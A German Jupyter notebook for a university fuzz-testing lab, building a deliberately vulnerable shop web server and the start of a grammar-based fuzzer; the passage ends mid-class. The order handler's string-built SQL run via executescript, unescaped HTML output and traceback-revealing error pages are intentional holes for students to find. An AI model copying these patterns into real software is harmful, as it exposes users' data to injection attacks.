{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Laborübung zum Fuzz-Testing\n",
    "Im Rahmen der Studienarbeit \"Fuzzing-Werkzeuge zum Security-Test\" an der DHBW Stuttgart sollte eine Laborübung zum Thema Fuzz-Testing erstellt werden. Die Laborübung soll die Studierenden in die Grundlagen von Fuzz-Testing einführen und sie dazu anleiten, selbstständig eine Website auf Sicherheitslücken zu testen durch die Anwendung von Grammatik-basiertem Fuzzing.\n",
    "\n",
    "Aufgaben sind mit der Überschrift \"AUFGABE\" gekennzeichnet. Dort sollen die Studierenden die Schritte befolgen, um die Laborübung abzuschließen.\n",
    "\n",
    "Zum Setup bitte zuerst die README.md lesen."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Folgende Installationsschritte sind notwendig, um dieses Notebook zu nutzen:  \n",
    "`pip install ipython selenium multiprocess`\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Benötigte Imports\n",
    "import os\n",
    "import sqlite3\n",
    "import urllib.parse\n",
    "import traceback\n",
    "import requests\n",
    "import copy\n",
    "import subprocess\n",
    "import re\n",
    "import random\n",
    "import string\n",
    "import IPython.core.display\n",
    "\n",
    "from optparse import Option\n",
    "from urllib.parse import urljoin\n",
    "from typing import Any, Optional, NoReturn, Tuple, List, Union, Dict, Callable\n",
    "from IPython.display import display\n",
    "from http.server import HTTPServer, BaseHTTPRequestHandler, HTTPStatus\n",
    "from multiprocess import Queue, Process"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "## Setup Webserver"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Setup der HTML-Skripts für die Seiten\n",
    "\n",
    "Ein Dictionary, das die verschiedenen Artikel eines Webstores enthält, dient als Referenz für die angebotenen Artikel.  \n",
    "Die zugrundeliegenden HTML-Dateien werden aus dem Verzeichnis `html_files` geladen und enthalten HTML-Inhalte für verschiedene Zwecke.  \n",
    "Mit `IPython.core.display.HTML(html_XX)` werden die HTML-Formulare im Jupyter Notebook angezeigt.  \n",
    "Für den `Order_received`-Screen wird die Bestellbestätigung mit Platzhalter im HTML angezeigt, sodass die Bestellbestätigung personalisiert wird.\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Items, die Webstore anbietet\n",
    "DHBW_MERCH = {\n",
    "    \"tshirtmennavy\": \"DHBW T-Shirt Navy Men\",\n",
    "    \"tshirtwomennavy\": \"DHBW T-Shirt Navy Women\",\n",
    "    \"tshirtmenwhite\": \"DHBW T-Shirt White Men\",\n",
    "    \"tshirtwomenwhite\": \"DHBW T-Shirt White Women\",\n",
    "    \"hoodienavy\": \"DHBW Hoodie Navy\",\n",
    "    \"hoodiegrey\": \"DHBW Hoodie Grey\",\n",
    "}\n",
    "\n",
    "with open(\"html_files/order_form.html\", \"r\", encoding=\"utf-8\") as f:\n",
    "    html_order_form = f.read()\n",
    "\n",
    "with open(\"html_files/terms_and_cond.html\", \"r\", encoding=\"utf-8\") as f:\n",
    "    html_terms_and_cond = f.read()\n",
    "\n",
    "with open(\"html_files/order_received.html\", \"r\", encoding=\"utf-8\") as f:\n",
    "    html_order_received = f.read()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "IPython.core.display.HTML(html_order_form)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "IPython.core.display.HTML(html_terms_and_cond)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "IPython.core.display.HTML(html_order_received.format(item_name=\"DHBW T-Shirt White Women\",\n",
    "                                name=\"Erika Musterfrau\",\n",
    "                                email=\"erika.musterfrau@example.com\",\n",
    "                                city=\"Stuttgart\",\n",
    "                                zip=\"70190\"))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Setup Datenbank\n",
    "Nun wird eine SQLite-Datenbank initialisiert, die verwendet wird, um Bestellungen zu speichern.  \n",
    "`ORDERS_DB` speichert den Namen der Datenbankdatei (\"orders.db\"), die für die Speicherung von Bestellungen verwendet wird.  \n",
    "Wenn eine Datenbankdatei mit dem Namen \"orders.db\" existiert, wird sie gelöscht. Sonst wird eine Verbindung zur neuen Datenbank hergestellt.  \n",
    "Falls die Tabelle `orders` bereits existiert, wird sie entfernt. Anschließend wird eine neue Tabelle `orders` erstellt, die die Spalten `item`, `name`, `email`, `city` und `zip` enthält.  \n",
    "Die Änderungen werden in der Datenbank gespeichert.  \n",
    "Die Funktion gibt die Datenbankverbindung zurück."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "ORDERS_DB = \"orders.db\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def init_db():\n",
    "    if os.path.exists(ORDERS_DB):\n",
    "        os.remove(ORDERS_DB)\n",
    "\n",
    "    db_connection = sqlite3.connect(ORDERS_DB)\n",
    "    db_connection.execute(\"DROP TABLE IF EXISTS orders\")\n",
    "    db_connection.execute(\"CREATE TABLE orders \"\n",
    "                          \"(item text, name text, email text, \"\n",
    "                          \"city text, zip text)\")\n",
    "    db_connection.commit()\n",
    "\n",
    "    return db_connection"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "db = init_db()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Beispiel-Interaktion mit DB\n",
    "```python\n",
    "# Eintrag hinzufügen\n",
    "\n",
    "db.execute(\"INSERT INTO orders \" +\n",
    "           \"VALUES ('tshirtmenwhite', 'Erika Musterfrau', \"\n",
    "           \"'erika.musterfrau@example.org', 'Stuttgart', '70190')\")\n",
    "db.commit() \n",
    "\n",
    "#Eintrag löschen\n",
    "\n",
    "db.execute(\"DELETE FROM orders WHERE name = 'Max Mustermann'\")\n",
    "db.commit()\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Umgang mit HTTP requests\n",
    "Der folgende Code definiert einen HTTP-Server, der HTTP-Anfragen verarbeitet und verschiedene HTML-Seiten bereitstellt. Der Server kann auch Bestellungen speichern.\n",
    "\n",
    "1. **Klasse `SimpleHTTPRequestHandler`**:\n",
    "    - **`do_GET` Methode**: Diese Methode verarbeitet GET-Anfragen und ist abhängig vom Pfad (entweder eine HTML-Seite oder ein 404-Fehler wird zurückgegeben).\n",
    "    - **Fehlerbehandlung**: Bei einer Ausnahme wird ein interner Serverfehler zurückgegeben.\n",
    "\n",
    "2. **Erweiterte `SimpleHTTPRequestHandler`-Klasse**: \n",
    "    - **`send_order_form`**: Sendet das HTML-Bestellformular als Antwort.\n",
    "    - **`send_terms_and_conditions`**: Sendet die HTML-AGB als Antwort.\n",
    "    - **`get_field_values`**: Extrahiert und gibt die Felder und deren Werte aus der URL-Abfragezeichenfolge zurück.\n",
    "    - **`handle_order`**: Handhabt eine Bestellung, indem sie die Felder aus der URL extrahiert, die Bestellung speichert und eine Bestellbestätigung sendet.\n",
    "    - **`store_order`**: Speichert die Bestelldaten in der SQLite-Datenbank.\n",
    "    - **`send_order_received`**: Sendet eine Bestellbestätigung als Antwort, indem sie die Werte in die Bestätigungs-HTML-Seite einfügt.\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):\n",
    "    pass\n",
    "\n",
    "    def do_GET(self):\n",
    "        try:\n",
    "            if self.path == \"/\":\n",
    "                self.send_order_form()\n",
    "            elif self.path.startswith(\"/order\"):\n",
    "                self.handle_order()\n",
    "            elif self.path.startswith(\"/terms\"):\n",
    "                self.send_terms_and_conditions()\n",
    "            else:\n",
    "                self.not_found()\n",
    "        except Exception:\n",
    "            self.internal_server_error()\n",
    "\n",
    "class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n",
    "    def send_order_form(self):\n",
    "        self.send_response(HTTPStatus.OK, \"Place your order\")\n",
    "        self.send_header(\"Content-type\", \"text/html\")\n",
    "        self.end_headers()\n",
    "        self.wfile.write(html_order_form.encode(\"utf8\"))\n",
    "\n",
    "    def send_terms_and_conditions(self):\n",
    "        self.send_response(HTTPStatus.OK, \"Terms and Conditions\")\n",
    "        self.send_header(\"Content-type\", \"text/html\")\n",
    "        self.end_headers()\n",
    "        self.wfile.write(html_terms_and_cond.encode(\"utf8\"))\n",
    "\n",
    "    def get_field_values(self):\n",
    "        # Note: this fails to decode non-ASCII characters properly\n",
    "        query_string = urllib.parse.urlparse(self.path).query\n",
    "\n",
    "        # fields is { 'item': ['tshirtmennavy'], 'name': ['Max Mustermann'], ...}\n",
    "        fields = urllib.parse.parse_qs(query_string, keep_blank_values=True)\n",
    "\n",
    "        values = {}\n",
    "        for key in fields:\n",
    "            values[key] = fields[key][0]\n",
    "\n",
    "        return values\n",
    "    \n",
    "    def handle_order(self):\n",
    "        values = self.get_field_values()\n",
    "        self.store_order(values)\n",
    "        self.send_order_received(values)\n",
    "\n",
    "    def store_order(self, values):\n",
    "        db = sqlite3.connect(ORDERS_DB)\n",
    "        # The following should be one line\n",
    "        sql_command = \"INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values)\n",
    "        self.log_message(\"%s\", sql_command)\n",
    "        db.executescript(sql_command)\n",
    "        db.commit()\n",
    "\n",
    "    def send_order_received(self, values):\n",
    "        values[\"item_name\"] = DHBW_MERCH[values[\"item\"]]\n",
    "        confirmation = html_order_received.format(**values).encode(\"utf8\")\n",
    "\n",
    "        self.send_response(HTTPStatus.OK, \"Order received\")\n",
    "        self.send_header(\"Content-type\", \"text/html\")\n",
    "        self.end_headers()\n",
    "        self.wfile.write(confirmation)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Andere Requests sind möglich, müssen aber implementiert werden.  "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Error Handling\n",
    "Dieser Code-Block erweitert die Fehlerbehandlung des HTTP-Servers, indem HTML-Seiten bei entsprechenden Fehlern an den Client zurückgesendet.  \n",
    "Die relevanten HTML-Dateien werden geladen und enthalten die Inhalte für die Fehlerseiten.\n",
    "Die `SimpleHTTPRequestHandler`-Klasse erweitert die vorherige und implementiert zusätzliche Methoden zur Fehlerbehandlung:\n",
    "    - **`not_found` Methode**: Diese Methode sendet eine 404-Fehlerseite, wenn die angeforderte Ressource nicht gefunden wird.\n",
    "    - **`internal_server_error` Methode**: Diese Methode sendet eine 500-Fehlerseite, wenn ein interner Serverfehler auftritt. Zusätzlich wird der Fehler im Server-Log protokolliert."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "with open(\"html_files/not_found.html\", \"r\", encoding=\"utf-8\") as f:\n",
    "    html_not_found = f.read()\n",
    "\n",
    "with open(\"html_files/internal_server_error.html\", \"r\", encoding=\"utf-8\") as f:\n",
    "    html_internal_server_error = f.read()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "IPython.core.display.HTML(html_not_found)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "IPython.core.display.HTML(html_internal_server_error)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n",
    "    def not_found(self):\n",
    "        self.send_response(HTTPStatus.NOT_FOUND, \"Not found\")\n",
    "\n",
    "        self.send_header(\"Content-type\", \"text/html\")\n",
    "        self.end_headers()\n",
    "\n",
    "        message = html_not_found\n",
    "        self.wfile.write(message.encode(\"utf8\"))\n",
    "\n",
    "    def internal_server_error(self):\n",
    "        self.send_response(HTTPStatus.INTERNAL_SERVER_ERROR, \"Internal Error\")\n",
    "\n",
    "        self.send_header(\"Content-type\", \"text/html\")\n",
    "        self.end_headers()\n",
    "\n",
    "        exc = traceback.format_exc()\n",
    "        self.log_message(\"%s\", exc.strip())\n",
    "\n",
    "        message = html_internal_server_error.format(error_message=exc)\n",
    "        self.wfile.write(message.encode(\"utf8\"))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Server Messages\n",
    "Server-Nachrichten sollen als Logs gesammelt werden. Zum Vereinfachen werden sie abgewandelt angezeigt und in einer Queue gespeichert."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Nachrichten stylen"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def rich_output() -> bool:\n",
    "    try:\n",
    "        rich = True\n",
    "    except NameError:\n",
    "        rich = False\n",
    "\n",
    "    return rich\n",
    "\n",
    "# Escaping unicode characters into ASCII for user-facing strings\n",
    "def unicode_escape(s: str, error: str = 'backslashreplace') -> str:\n",
    "    def ascii_chr(byte: int) -> str:\n",
    "        if 0 <= byte <= 127:\n",
    "            return chr(byte)\n",
    "        return r\"\\x%02x\" % byte\n",
    "\n",
    "    bytes = s.encode('utf-8', error)\n",
    "    return \"\".join(map(ascii_chr, bytes))\n",
    "\n",
    "# Same, but escaping unicode only if output is not a terminal\n",
    "def terminal_escape(s: str) -> str:\n",
    "    if rich_output():\n",
    "        return s\n",
    "    return unicode_escape(s)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Queue erstellen\n",
    "Dieser Code ermöglicht es, Server-Nachrichten als Logs zu sammeln und formatiert anzuzeigen. Die Nachrichten werden in einer Queue gespeichert und können bei Bedarf gedruckt oder gelöscht werden."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "HTTPD_MESSAGE_QUEUE = Queue()\n",
    "\n",
    "def display_httpd_message(message: str) -> None:\n",
    "    if rich_output():\n",
    "        display(\n",
    "            IPython.core.display.HTML(\n",
    "                '<pre style=\"background: NavajoWhite;\">' +\n",
    "                message +\n",
    "                \"</pre>\"))\n",
    "    else:\n",
    "        print(terminal_escape(message))\n",
    "\n",
    "def print_httpd_messages():\n",
    "    while not HTTPD_MESSAGE_QUEUE.empty():\n",
    "        message = HTTPD_MESSAGE_QUEUE.get()\n",
    "        display_httpd_message(message)\n",
    "\n",
    "def clear_httpd_messages() -> None:\n",
    "    while not HTTPD_MESSAGE_QUEUE.empty():\n",
    "        HTTPD_MESSAGE_QUEUE.get()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n",
    "    def log_message(self, format: str, *args) -> None:\n",
    "        message = (\"%s - - [%s] %s\\n\" %\n",
    "                   (self.address_string(),\n",
    "                    self.log_date_time_string(),\n",
    "                    format % args))\n",
    "        HTTPD_MESSAGE_QUEUE.put(message)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Server starten\n",
    "Der HTTP-Server, der auf eingehende Anfragen wartet und diese verarbeitet, wird gestartet. Er enthält Funktionen zum Herunterladen von Webressourcen, zum Starten des Servers und zum Verwalten von Server-Nachrichten.\n",
    "\n",
    "1. **`webbrowser` Funktion**: Diese Funktion lädt eine Webressource herunter und gibt deren Inhalt zurück. Zusätzlich werden Server-Nachrichten je nach dem `mute` Parameter angezeigt oder gelöscht.\n",
    "2. **`run_httpd_forever` Funktion**: Diese Funktion startet den HTTP-Server und versucht ihn auf einem Port zwischen 8800 und 9000 zu zuweisen. Der Server läuft ununterbrochen, bis er manuell gestoppt wird.\n",
    "3. **`start_httpd` Funktion**: Diese Funktion startet den HTTP-Server in einem separaten Prozess und gibt den Prozess und die URL des Servers zurück.\n",
    "4. Der Server wird gestartet und die URL des Servers wird ausgegeben."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def webbrowser(url: str, mute: bool = False) -> str:\n",
    "    try:\n",
    "        r = requests.get(url)\n",
    "        contents = r.text\n",
    "    finally:\n",
    "        if not mute:\n",
    "            print_httpd_messages()\n",
    "        else:\n",
    "            clear_httpd_messages()\n",
    "\n",
    "    return contents"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def run_httpd_forever(handler_class: type) -> NoReturn:\n",
    "    host = \"0.0.0.0\"\n",
    "    localhost = \"localhost\"\n",
    "    for port in range(8800, 9000):\n",
    "        httpd_address = (host, port)\n",
    "\n",
    "        try:\n",
    "            httpd = HTTPServer(httpd_address, handler_class)\n",
    "            break\n",
    "        except OSError:\n",
    "            continue\n",
    "\n",
    "    httpd_url = \"http://\" + localhost + \":\" + repr(port)\n",
    "    HTTPD_MESSAGE_QUEUE.put(httpd_url)\n",
    "    httpd.serve_forever()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def start_httpd(handler_class: type = SimpleHTTPRequestHandler) \\\n",
    "        -> Tuple[Process, str]:\n",
    "    clear_httpd_messages()\n",
    "\n",
    "    httpd_process = Process(target=run_httpd_forever, args=(handler_class,))\n",
    "    httpd_process.start()\n",
    "\n",
    "    httpd_url = HTTPD_MESSAGE_QUEUE.get()\n",
    "    return httpd_process, httpd_url\n",
    "\n",
    "httpd_process, httpd_url = start_httpd()\n",
    "print(httpd_url)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Beispiel-Interaktion mit dem Webserver\n",
    "Diese Sektion bietet einen Einblick in den Umgang mit dem Webserver von einem Python-Programm aus."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```python\n",
    "# get Browser access\n",
    "IFrame(httpd_url, '100%', 230)\n",
    "\n",
    "# retrieve messages produced by the HTTP server\n",
    "print_httpd_messages()\n",
    "\n",
    "# interact with database\n",
    "print(db.execute(\"SELECT * FROM orders\").fetchall())\n",
    "\n",
    "db.execute(\"DELETE FROM orders\")\n",
    "db.commit()\n",
    "\n",
    "# retieve the home page\n",
    "contents = webbrowser(httpd_url)\n",
    "IPython.core.display.HTML(contents)\n",
    "\n",
    "# place an order\n",
    "urljoin(httpd_url, \"/order?foo=bar\")\n",
    "contents = webbrowser(urljoin(httpd_url, \"/order?item=tshirtmennavy&name=Max+Mustermann&email=max_mustermann%40example.com&city=Bad+Wildbad&zip=28663\"))\n",
    "\n",
    "IPython.core.display.HTML(contents)\n",
    "print(db.execute(\"SELECT * FROM orders\").fetchall())\n",
    "\n",
    "# test error messages\n",
    "IPython.core.display.HTML(webbrowser(urljoin(httpd_url, \"/some/other/path\")))\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Fuzzing\n",
    "Die folgenden Funktionen werden für das Erstellen der Grammatik verwendet."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# cgi_encode() to encode strings for URLs\n",
    "def cgi_encode(s: str, do_not_encode: str = \"\") -> str:\n",
    "    ret = \"\"\n",
    "    for c in s:\n",
    "        if (c in string.ascii_letters or c in string.digits\n",
    "                or c in \"$-_.+!*'(),\" or c in do_not_encode):\n",
    "            ret += c\n",
    "        elif c == ' ':\n",
    "            ret += '+'\n",
    "        else:\n",
    "            ret += \"%%%02x\" % ord(c)\n",
    "    return ret\n",
    "\n",
    "Expansion = Union[str, Tuple[str, Option]]\n",
    "\n",
    "# generates a list of characters that includes all characters in the ASCII range from character_start to character_end (inclusive)\n",
    "def crange(character_start: str, character_end: str) -> List[Expansion]:\n",
    "    return [chr(i)\n",
    "            for i in range(ord(character_start), ord(character_end) + 1)]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### ... mit erwarteten Inputs\n",
    "In dieser Sektion wird das Fuzzing mit erwarteten Inputs durchgeführt.\n",
    "\n",
    "Es werden eine Grammatik für Bestellungen erstellt, Fuzzing-Eingaben generiert, diese Eingaben verwendet und die gespeicherten Bestellungen in der Datenbank überprüft.  \n",
    "Die Grammatik `ORDER_GRAMMAR` definiert, wie Bestellungen aufgebaut sind. Sie enthält Regeln für die verschiedenen Teile einer Bestellung wie Artikel, Name, E-Mail, Stadt und Postleitzahl.  \n",
    "Ein `GrammarFuzzer` wird mit der Bestellgrammatik erstellt und generiert fünf verschiedene Bestell-URLs basierend auf dieser Grammatik.  \n",
    "Eine der generierten Fuzzing-Eingaben wird verwendet, um eine HTTP-Anfrage an den laufenden Server zu senden. Die HTML-Antwort wird im Jupyter Notebook angezeigt.  \n",
    "Der Inhalt der Datenbank wird abgefragt und ausgegeben, um sicherzustellen, dass die Bestellungen korrekt gespeichert wurden."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# create grammar\n",
    "RE_NONTERMINAL = re.compile(r'(<[^<> ]*>)')\n",
    "\n",
    "Grammar = Dict[str, List[Expansion]]\n",
    "\n",
    "DerivationTree = Tuple[str, Optional[List[Any]]]\n",
    "\n",
    "Outcome = str\n",
    "\n",
    "def is_nonterminal(s):\n",
    "    return RE_NONTERMINAL.match(s)\n",
    "\n",
    "def all_terminals(tree: DerivationTree) -> str:\n",
    "    (symbol, children) = tree\n",
    "    if children is None:\n",
    "        return symbol\n",
    "\n",
    "    if len(children) == 0:\n",
    "        # This is a terminal symbol\n",
    "        return symbol\n",
    "\n",
    "    # This is an expanded symbol:\n",
    "    # Concatenate all terminal symbols from all children\n",
    "    return ''.join([all_terminals(c) for c in children])\n",
    "\n",
    "class Runner:\n",
    "    PASS = \"PASS\"\n",
    "    FAIL = \"FAIL\"\n",
    "    UNRESOLVED = \"UNRESOLVED\"\n",
    "\n",
    "    def __init__(self) -> None:\n",
    "        pass\n",
    "\n",
    "    def run(self, inp: str) -> Any:\n",
    "        return (inp, Runner.UNRESOLVED)\n",
    "\n",
    "class PrintRunner(Runner):\n",
    "    def run(self, inp) -> Any:\n",
    "        print(inp)\n",
    "        return (inp, Runner.UNRESOLVED)\n",
    "\n",
    "class Fuzzer:\n",
    "    def __init__(self) -> None:\n",
    "        pass\n",
    "\n",
    "    def fuzz(self) -> str:\n",
    "        return \"\"\n",
    "\n",
    "    def run(self, runner: Runner = Runner()) \\\n",
    "            -> Tuple[subprocess.CompletedProcess, Outcome]:\n",
    "        return runner.run(self.fuzz())\n",
    "\n",
    "    def runs(self, runner: Runner = PrintRunner(), trials: int = 10) \\\n",
    "            -> List[Tuple[subprocess.CompletedProcess, Outcome]]:\n",
    "        return [self.run(runner) for i in range(trials)]\n",
    "\n",
    "START_SYMBOL = \"<start>\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def exp_string(expansion: Expansion) -> str:\n",
    "    if isinstance(expansion, str):\n",
    "        return expansion\n",
    "    return expansion[0]\n",
    "\n",
    "def expansion_to_children(expansion: Expansion) -> List[DerivationTree]:\n",
    "    expansion = exp_string(expansion)\n",
    "    assert isinstance(expansion, str)\n",
    "\n",
    "    if expansion == \"\":  # Special case: epsilon expansion\n",
    "        return [(\"\", [])]\n",
    "\n",
    "    strings = re.split(RE_NONTERMINAL, expansion)\n",
    "    return [(s, None) if is_nonterminal(s) else (s, [])\n",
    "            for s in strings if len(s) > 0]\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "class GrammarFuzzer(Fuzzer):\n",
    "    def __init__(self,\n",
    "                 grammar: Grammar,\n",
    "                 start_symbol: str = START_SYMBOL,\n",
    "                 min_nonterminals: int = 0,\n",
    "                 max_nonterminals: int = 10,\n",
    "                 disp: bool = False,\n",
    "                 log: Union[bool, int] = False) -> None:\n",
    "        \"\"\"Erzeuge Strings aus `grammar`, beginnend mit `start_symbol`.\n",
    "        Wenn `min_nonterminals` oder `max_nonterminals` angegeben sind, verwende sie als Grenzen\n",
    "        für die Anzahl der erzeugten Nichtterminalsymbole.\n",
    "        Wenn `disp` gesetzt ist, zeige die Zwischenableitungsbäume an.\n",
    "        Wenn `log` gesetzt ist, zeige Zwischenstufen als Text in der Standardausgabe an.\"\"\"\n",
    "\n",
    "        self.grammar = grammar\n",
    "        self.start_symbol = start_symbol\n",
    "        self.min_nonterminals = min_nonterminals\n",
    "        self.max_nonterminals = max_nonterminals\n",
    "        self.disp = disp\n",
    "        self.log = log\n",
    "\n",
    "    # Weitere Methoden zum Erweitern von Knoten und Bäumen\n",
    "\n",
    "    def expand_node_max_cost(self, node: DerivationTree) -> DerivationTree:\n",
    "        if self.log:\n",
    "            print(\"Expanding\", all_terminals(node), \"at maximum cost\")\n",
    "\n",
    "        return self.expand_node_by_cost(node, max)\n",
    "\n",
    "    def possible_expansions(self, node: DerivationTree) -> int:\n",
    "        (symbol, children) = node\n",
    "        if children is None:\n",
    "            return 1\n",
    "\n",
    "        return sum(self.possible_expansions(c) for c in children)\n",
    "\n",
    "    def any_possible_expansions(self, node: DerivationTree) -> bool:\n",
    "        (symbol, children) = node\n",
    "        if children is None:\n",
    "            return True\n",
    "\n",
    "        return any(self.any_possible_expansions(c) for c in children)\n",
    "\n",
    "    def expansion_to_children(self, expansion: Expansion) -> List[DerivationTree]:\n",
    "        return expansion_to_children(expansion)\n",
    "\n",
    "\n",
    "    def expand_node_randomly(self, node: DerivationTree) -> DerivationTree:\n",
    "        (symbol, children) = node\n",
    "        assert children is None\n",
    "\n",
    "        if self.log:\n",
    "            print(\"Expanding\", all_terminals(node), \"randomly\")\n",
    "\n",
    "        # Fetch the possible expansions from grammar...\n",
    "        expansions = self.grammar[symbol]\n",
    "        children_alternatives: List[List[DerivationTree]] = [\n",
    "            self.expansion_to_children(expansion) for expansion in expansions\n",
    "        ]\n",
    "\n",
    "        # ... and select a random expansion\n",
    "        index = self.choose_node_expansion(node, children_alternatives)\n",
    "        chosen_children = children_alternatives[index]\n",
    "\n",
    "        # Process children (for subclasses)\n",
    "        chosen_children = self.process_chosen_children(chosen_children,\n",
    "                                                       expansions[index])\n",
    "\n",
    "        # Return with new children\n",
    "        return (symbol, chosen_children)\n",
    "\n",
    "    def choose_tree_expansion(self,\n",
    "                              tree: DerivationTree,\n",
    "                              children: List[DerivationTree]) -> int:\n",
    "        return random.randrange(0, len(children))\n",
    "\n",
    "    def expand_tree_once(self, tree: DerivationTree) -> DerivationTree:\n",
    "        (symbol, children) = tree\n",
    "        if children is None:\n",
    "            # Expand this node\n",
    "            return self.expand_node(tree)\n",
    "\n",
    "        # Find all children with possible expansions\n",
    "        expandable_children = [\n",
    "            c for c in children if self.any_possible_expansions(c)]\n",
    "\n",
    "        index_map = [i for (i, c) in enumerate(children)\n",
    "                     if c in expandable_children]\n",
    "\n",
    "        # Select a random child\n",
    "        child_to_be_expanded = \\\n",
    "            self.choose_tree_expansion(tree, expandable_children)\n",
    "\n",
    "        # Expand in place\n",
    "        children[index_map[child_to_be_expanded]] = \\\n",
    "            self.expand_tree_once(expandable_children[child_to_be_expanded])\n",
    "\n",
    "        return tree\n",
    "\n",
    "    def log_tree(self, tree: DerivationTree) -> None:\n",
    "        if self.log:\n",
    "            print(\"Tree:\", all_terminals(tree))\n",
    "\n",
    "    def expand_tree_with_strategy(self, tree: DerivationTree,\n",
    "                                  expand_node_method: Callable,\n",
    "                                  limit: Optional[int] = None):\n",
    "        self.expand_node = expand_node_method\n",
    "        while ((limit is None\n",
    "                or self.possible_expansions(tree) < limit)\n",
    "               and self.any_possible_expansions(tree)):\n",
    "            tree = self.expand_tree_once(tree)\n",
    "            self.log_tree(tree)\n",
    "        return tree\n",
    "\n",
    "    def expand_tree(self, tree: DerivationTree) -> DerivationTree:\n",
    "        self.log_tree(tree)\n",
    "        tree = self.expand_tree_with_strategy(\n",
    "            tree, self.expand_node_max_cost, self.min_nonterminals)\n",
    "        tree = self.expand_tree_with_strategy(\n",
    "            tree, self.expand_node_randomly, self.max_nonterminals)\n",
    "        tree = self.expand_tree_with_strategy(\n",
    "            tree, self.expand_node_min_cost)\n",
    "\n",
    "        assert self.possible_expansions(tree) == 0\n",
    "\n",
    "        return tree\n",
    "\n",
    "    def init_tree(self) -> DerivationTree:\n",
    "        return (self.start_symbol, None)\n",
    "\n",
    "    def fuzz_tree(self) -> DerivationTree:\n",
    "        tree = self.init_tree()\n",
    "\n",
    "        # Expand all nonterminals\n",
    "        tree = self.expand_tree(tree)\n",
    "        if self.log:\n",
    "            print(repr(all_terminals(tree)))\n",
    "        return tree\n",
    "\n",
    "    # Produce string from grammar\n",
    "    def fuzz(self) -> str:\n",
    "        self.derivation_tree = self.fuzz_tree()\n",
    "        return all_terminals(self.derivation_tree)\n",
    "\n",
    "    def choose_node_expansion(self, node: DerivationTree,\n",
    "                              children_alternatives: List[List[DerivationTree]]) -> int:\n",
    "        return random.randrange(0, len(children_alternatives))\n",
    "\n",
    "    def process_chosen_children(self,\n",
    "                                chosen_children: List[DerivationTree],\n",
    "                                expansion: Expansion) -> List[DerivationTree]:\n",
    "        return chosen_children\n",
    "\n",
    "    def expand_node_min_cost(self, node: DerivationTree) -> DerivationTree:\n",
    "        if self.log:\n",
